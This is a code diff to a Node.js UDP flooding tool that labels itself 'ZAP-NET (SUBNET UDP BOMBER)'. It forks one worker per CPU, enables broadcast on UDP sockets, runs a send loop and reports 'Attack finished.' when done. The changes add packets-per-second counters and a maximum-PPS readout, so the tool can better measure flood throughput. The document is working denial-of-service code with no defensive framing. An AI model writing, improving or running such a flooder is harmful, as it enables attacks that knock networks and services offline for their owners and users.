@@ -61,28 +61,27 @@ if (cluster.isMaster) {
   let totalPackets = 0;
   let totalBytes = 0;
   let maxBps = 0;
+  let maxPps = 0;
 
-  // Create stats holder per worker
-  const stats = Array(cpuCount).fill().map(() => ({ sent: 0, bytes: 0, bps: 0 }));
+  const stats = Array(cpuCount).fill().map(() => ({ sent: 0, bytes: 0, bps: 0, pps: 0 }));
 
-  // Fork workers
   for (let i = 0; i < cpuCount; i++) cluster.fork();
 
-  // Listen for stats messages from workers
   Object.values(cluster.workers).forEach((worker, idx) => {
     worker.on('message', (msg) => {
       if (msg.type === 'stats') stats[idx] = msg;
     });
   });
 
-  // Log aggregated stats every 2 seconds
   setInterval(() => {
     const sent = stats.reduce((acc, cur) => acc + cur.sent, 0);
     const bytes = stats.reduce((acc, cur) => acc + cur.bytes, 0);
     const bps = stats.reduce((acc, cur) => acc + cur.bps, 0);
+    const pps = stats.reduce((acc, cur) => acc + cur.pps, 0);
     totalPackets += sent;
     totalBytes += bytes;
     if (bps > maxBps) maxBps = bps;
+    if (pps > maxPps) maxPps = pps;
 
     console.clear();
     console.log(`ZAP-NET (SUBNET UDP BOMBER)`);
@@ -92,9 +91,11 @@ if (cluster.isMaster) {
     console.log(`Packets Sent: ${totalPackets.toLocaleString()}`);
     console.log(`Bandwidth Sent: ${formatBytes(totalBytes)}`);
     console.log(`Current BPS: ${formatBytes(bps)}/s`);
+    console.log(`Current PPS: ${pps.toLocaleString()}/s`);
     console.log(`Max BPS: ${formatBytes(maxBps)}/s`);
+    console.log(`Max PPS: ${maxPps.toLocaleString()}/s`);
     console.log(`-----------------------------------\n`);
-  }, 2000);
+  }, 5000);
 
   setTimeout(() => {
     console.log('Attack finished.');
@@ -105,14 +106,14 @@ if (cluster.isMaster) {
 } else {
   const socket = dgram.createSocket('udp4');
 
-  // Optional: bind socket for some platforms (can improve reliability)
   socket.bind(() => {
-    socket.setBroadcast(true); // enable if needed
+    socket.setBroadcast(true);
   });
 
   let sent = 0;
   let bytesSent = 0;
   let bps = 0;
+  let pps = 0;
 
   function sendLoop() {
     if (Date.now() > endTime) return;
@@ -125,6 +126,7 @@ if (cluster.isMaster) {
           sent++;
           bytesSent += payloadSize;
           bps += payloadSize;
+          pps++;
         }
       });
     }
@@ -133,10 +135,11 @@ if (cluster.isMaster) {
   }
 
   setInterval(() => {
-    process.send({ type: 'stats', sent, bytes: bytesSent, bps });
+    process.send({ type: 'stats', sent, bytes: bytesSent, bps, pps });
     sent = 0;
     bytesSent = 0;
     bps = 0;
+    pps = 0;
   }, 1000);
 
   sendLoop();
